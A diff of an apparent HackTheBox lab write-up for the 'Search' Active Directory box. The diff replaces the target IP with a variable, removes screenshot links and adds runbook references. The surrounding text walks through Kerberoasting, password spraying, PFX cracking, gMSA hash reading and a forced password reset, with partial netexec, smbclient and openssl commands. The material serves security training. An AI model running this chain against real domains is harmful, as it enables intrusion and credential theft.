@@ -4,7 +4,7 @@ platform: HackTheBox
 os: Windows 10 / Server 2019 Build 17763 x64
 hostname: RESEARCH
 difficulty: Hard
-ip: 10.129.229.57
+ip: $BoxIP
 status: Complete
 domain: search.htb
 ---
@@ -49,7 +49,7 @@ IIS staff image
 | Difficulty | Hard |
 | Operating system | Windows 10 / Server 2019 Build 17763 x64 |
 | Hostname | RESEARCH |
-| Target | 10.129.229.57 |
+| Target | `$BoxIP` |
 | Domain | search.htb |
 | Open services | DNS, IIS HTTP/HTTPS, Kerberos, RPC, LDAP/LDAPS, SMB, Global Catalog LDAP/LDAPS, WMSvc 8172, ADWS 9389 |
 | Initial access | Credential in an IIS staff image |
@@ -103,7 +103,7 @@ The same transcript is copied into the vault at:
 | PSWA cookies | loot/cookies.txt |
 | User proof | loot/user.txt |
 | Flag index | loot/flags.txt |
-| Screenshots | screenshots/1.nmap-allports.png through screenshots/23.flag-text.png |
+| Screenshots | Private screenshot folder under the case workspace; no images are embedded in this vault note |
 
 > [!note] Private evidence
 > Passwords, hashes, and flag values remain in the source .env, loot, and raw log. They are intentionally not duplicated in the main narrative or in a public-report section.
@@ -114,7 +114,7 @@ Use a temporary folder for a clean reproduction and retain the source workspace 
 
 ~~~bash
 boxset BoxName Search
-boxset BoxIP 10.129.229.57
+boxset BoxIP $BoxIP
 boxset Domain search.htb
 boxset Username hope.sharp
 boxset Port 4444
@@ -138,7 +138,7 @@ The source run also recorded the PFX password and gMSA NT hash in .env. Keep tho
 The manual run used the box helper and captured the terminal session in Search.log. A clean reproduction should create the local evidence tree before scanning:
 
 ~~~bash
-boxstart Search 10.129.229.57 htb
+boxstart Search $BoxIP htb
 htblog
 mkdir -p "$BoxDir"/{nmap,loot,notes,screenshots}
 ~~~
@@ -177,8 +177,6 @@ The scan found:
 
 Dynamic RPC ports were also present. This was a classic domain-controller footprint with IIS and Windows Management Service additions.
 
-![Nmap full scan](<file:///home/kali/Platforms/HackTheBox/Search/screenshots/1.nmap-allports.png>)
-
 > [!warning] Nmap privilege gotcha
 > If Nmap reports a raw-socket permission error, do not treat it as a closed-port result. Use the connect-scan fallback when appropriate, or rerun the intended SYN scan with sudo. Record which scan produced the authoritative port list.
 
@@ -210,8 +208,6 @@ Domain: search.htb
 SMB signing enabled and required
 ~~~
 
-![Nmap service scan](<file:///home/kali/Platforms/HackTheBox/Search/screenshots/2.nmap-services.png>)
-
 Record the domain before using Kerberos tools:
 
 ~~~bash
@@ -232,8 +228,6 @@ netexec smb "$BoxIP" --shares -u '' -p ''
 
 Null authentication negotiation worked, but anonymous share enumeration returned access denied. That is useful evidence: anonymous negotiation is enabled, but it does not provide useful share access.
 
-![SMB null authentication](<file:///home/kali/Platforms/HackTheBox/Search/screenshots/3.smb-null.png>)
-
 Inspect the IIS homepage and protected paths:
 
 ~~~bash
@@ -243,10 +237,6 @@ curl -si "http://$BoxIP/certsrv"
 ~~~
 
 The homepage title was Search — Just Testing IIS. /staff returned 403 without the required client certificate. /certsrv returned 401 with Negotiate and NTLM challenges, confirming that AD CS was present.
-
-![Team names](<file:///home/kali/Platforms/HackTheBox/Search/screenshots/4.team-names.png>)
-
-![AD CS authentication clue](<file:///home/kali/Platforms/HackTheBox/Search/screenshots/5.certsrv-401.png>)
 
 ## 5. Download the homepage images and recover the first credential
 
@@ -279,8 +269,6 @@ The useful image was slide_2.jpg. It is a diary/planner image with a handwritten
 hope.sharp : [private password in .env]
 ~~~
 
-![Initial image credential](<file:///home/kali/Platforms/HackTheBox/Search/screenshots/6.OSINT-foothold.png>)
-
 > [!warning] Image-review gotcha
 > Do not stop after extracting visible names from a homepage. Download every referenced image and inspect it at readable resolution. The password was not in the HTML or page text; it was handwritten inside a staff photo.
 
@@ -295,10 +283,6 @@ netexec smb "$BoxIP" -u hope.sharp -p "$Password" --shares
 ~~~
 
 Hope could read CertEnroll, IPC$, NETLOGON, RedirectedFolders$, and SYSVOL. RedirectedFolders$ also permitted writing, making user profiles the next source of names and files.
-
-![Hope credential validation](<file:///home/kali/Platforms/HackTheBox/Search/screenshots/7.hope-sharp-valid.png>)
-
-![Hope share access](<file:///home/kali/Platforms/HackTheBox/Search/screenshots/8.hope-shares.png>)
 
 ## 7. Build the username list and fix Kerberos name resolution
 
@@ -339,10 +323,6 @@ netexec ldap "$BoxIP" -u hope.sharp -p "$Password" \
 
 The retry returned a service principal for web_svc and wrote a $krb5tgs$23$ ticket to loot.
 
-![Redirected profile names](<file:///home/kali/Platforms/HackTheBox/Search/screenshots/9.redirected-floders.png>)
-
-![Kerberoasting result](<file:///home/kali/Platforms/HackTheBox/Search/screenshots/10.kerboroast-hit.png>)
-
 > [!warning] Kerberos DNS gotcha
 > Kerberos is name-sensitive. A valid IP connection can still fail if the realm/domain and DC names do not resolve. Save the original /etc/hosts, add only the required mapping, and use the FQDN consistently in later certificate and PSWA steps.
 
@@ -367,10 +347,6 @@ netexec smb "$BoxIP" \
 ~~~
 
 The successful results were web_svc and edgar.jacobs. The important finding was password reuse: a service-account password also authenticated as Edgar.
-
-![Cracked web service account](<file:///home/kali/Platforms/HackTheBox/Search/screenshots/11.websrvc-cracked.png>)
-
-![Edgar password-reuse hit](<file:///home/kali/Platforms/HackTheBox/Search/screenshots/12.edgar-spray-hit-pwd-reuse.png>)
 
 > [!warning] Spray discipline
 > One password across many known usernames is a controlled spray. Do not turn this into a password dictionary per user. Preserve the list, exact password source, service tested, and successful accounts.
@@ -404,8 +380,6 @@ smbclient "//$BoxIP/RedirectedFolders$" \
   -c 'get "edgar.jacobs/Desktop/Phishing_Attempt.xlsx" '"$BoxDir"'/loot/Phishing_Attempt.xlsx'
 ~~~
 
-![Edgar share access](<file:///home/kali/Platforms/HackTheBox/Search/screenshots/13.edgar-shares.png>)
-
 > [!warning] SMB path gotcha
 > A successful share connection does not mean a shell wildcard resolves the same way as a server-side SMB path. When mget fails, list the directory and issue a quoted get for the exact relative path.
 
@@ -420,8 +394,6 @@ unzip -p "$BoxDir/loot/Phishing_Attempt.xlsx" \
 ~~~
 
 The workbook headers included firstname, lastname, and password. The strings contained multiple candidate passwords associated with staff names. The successful row was the Sierra Frye entry, recorded privately as Username4 and Password4.
-
-![XLSX extracted strings](<file:///home/kali/Platforms/HackTheBox/Search/screenshots/14.xlsx-strings.png>)
 
 > [!abstract] XLSX triage pattern
 > An Office document is a ZIP archive. Start with unzip -l, then inspect sharedStrings.xml and worksheet XML. Workbook or worksheet protection does not necessarily protect the underlying XML from offline review.
@@ -441,8 +413,6 @@ smbclient "//$BoxIP/RedirectedFolders$" \
 ~~~
 
 The user proof was saved to loot/user.txt and indexed in loot/flags.txt.
-
-![User proof](<file:///home/kali/Platforms/HackTheBox/Search/screenshots/15.user-flag.png>)
 
 Sierra's Downloads/Backups directory contained:
 
@@ -464,8 +434,6 @@ smbclient "//$BoxIP/RedirectedFolders$" \
   -U "search.htb/sierra.frye%$Password4" \
   -c 'get "sierra.frye/Downloads/Backups/staff.pfx" '"$BoxDir"'/loot/staff.pfx; get "sierra.frye/Downloads/Backups/search-RESEARCH-CA.p12" '"$BoxDir"'/loot/search-RESEARCH-CA.p12'
 ~~~
-
-![Certificate backups](<file:///home/kali/Platforms/HackTheBox/Search/screenshots/16.backups-certs.png>)
 
 ## 12. Crack and inspect the staff PKCS#12 certificate
 
@@ -491,10 +459,6 @@ openssl pkcs12 -in "$BoxDir/loot/staff.pfx" \
 ~~~
 
 The subject identified Sierra Frye and the issuer was search-RESEARCH-CA. This ties the certificate to the AD CS infrastructure hinted at by /certsrv.
-
-![PFX cracked](<file:///home/kali/Platforms/HackTheBox/Search/screenshots/17.pfx-cracked.png>)
-
-![PFX subject and issuer](<file:///home/kali/Platforms/HackTheBox/Search/screenshots/18.pfx-subject.png>)
 
 > [!warning] PKCS#12 gotcha
 > A PFX/P12 file is not a PEM certificate. OpenSSL can inspect it, but curl must be told --cert-type P12; otherwise it attempts PEM parsing and reports that it cannot load the PEM client certificate.
@@ -544,8 +508,6 @@ In the PSWA form:
 5. Leave the normal WSMAN port and Microsoft.PowerShell configuration.
 6. Submit and confirm an interactive PowerShell console.
 
-![PowerShell Web Access login](<file:///home/kali/Platforms/HackTheBox/Search/screenshots/19.pwr-login.png>)
-
 > [!warning] PSWA gotcha
 > PSWA is a stateful ASP.NET application. Replaying only the visible fields is not enough; hidden ViewState/EventValidation values and cookies are part of the login flow. The browser was the reliable manual client.
 
@@ -567,10 +529,6 @@ netexec ldap "$BoxIP" \
 ~~~
 
 The result identified BIR-ADFS-GMSA$ and PrincipalsAllowedToReadPassword: ITSec. The command also returned the gMSA NT hash; save it privately and keep the trailing dollar sign in the account name.
-
-![PowerShell groups](<file:///home/kali/Platforms/HackTheBox/Search/screenshots/20.groups.png>)
-
-![gMSA hash retrieval](<file:///home/kali/Platforms/HackTheBox/Search/screenshots/21.gmsa-hash.png>)
 
 > [!warning] gMSA syntax gotcha
 > Service and machine accounts end in $. Quote BIR-ADFS-GMSA$ in shell commands so the shell does not interpret the dollar sign. A gMSA read is also an authorization finding: record both the readable account and the group listed under PrincipalsAllowedToReadPassword.
@@ -594,8 +552,6 @@ netexec smb "$BoxIP" \
 ~~~
 
 The gMSA authenticated successfully, BloodyAD reported Password changed successfully, and NetExec returned Pwn3d!, proving local administrator access.
-
-![Tristan local administrator validation](<file:///home/kali/Platforms/HackTheBox/Search/screenshots/22.tristan-pwn3d.png>)
 
 > [!warning] ACL-abuse gotcha
 > The gMSA hash is not automatically Domain Admin. Its value is the authenticated identity that has a delegated directory right. Verify the exact target object and right, make one controlled password change, validate it, and record the state that must be restored.
@@ -622,8 +578,6 @@ The output was saved as the root proof in loot/flags.txt. The completed run then
 boxdone
 ~~~
 
-![Final flag text](<file:///home/kali/Platforms/HackTheBox/Search/screenshots/23.flag-text.png>)
-
 > [!tip] Final-proof habit
 > When NetExec reports Pwn3d!, use a single harmless read command to prove the requested file or identity. Keep the command short, quote the Windows path once, and save the raw output before marking the box complete.
 
@@ -632,12 +586,17 @@ boxdone
 - [[OSCP/RUNBOOK V2/AD - Service Scan|AD - Service Scan]] — full TCP and focused service enumeration
 - [[OSCP/RUNBOOK V2/AD - Web Enum|AD - Web Enum]] — IIS content, staff names, image download, and /certsrv clue
 - [[OSCP/RUNBOOK V2/AD - Credential Validation|AD - Credential Validation]] — Hope, web_svc, Edgar, and Sierra validation
+- [[OSCP/RUNBOOK V2/Windows - SMB Enum|Windows - SMB Enum]] — null-session boundary, authenticated share traversal, exact paths, and Office/XML triage
 - [[OSCP/RUNBOOK V2/AD - Kerberoasting|AD - Kerberoasting]] — SPN discovery, TGS capture, and offline cracking
 - [[OSCP/RUNBOOK V2/AD - Group Triage|AD - Group Triage]] — Sierra's group context and ITSec route
 - [[OSCP/RUNBOOK V2/AD - BloodHound|AD - BloodHound]] — directory-rights reasoning and gMSA/ACL triage
 - [[OSCP/RUNBOOK V2/AD - ForceChangePassword|AD - ForceChangePassword]] — gMSA-to-Tristan password reset
 - [[OSCP/RUNBOOK V2/AD - WinRM Foothold|AD - WinRM Foothold]] — Windows PowerShell Web Access shell identity and triage
+- [[OSCP/RUNBOOK V2/AD - PowerShell Web Access|AD - PowerShell Web Access]] — PKCS#12 cracking, certificate-authenticated IIS, stateful PSWA login, and shell proof
 - [[OSCP/RUNBOOK V2/AD - Clean Down|AD - Clean Down]] — evidence retention, host-file cleanup, and target-state warning
+
+> [!success] Runbook coverage
+> Image/media review, bounded password reuse, Office/XML triage, PKCS#12 certificate handling, PSWA state, gMSA authorization, and delegated password reset are covered by the linked RUNBOOK V2 stages. No runbook gap remains for the verified Search chain.
 
 ## Collect the flags
 
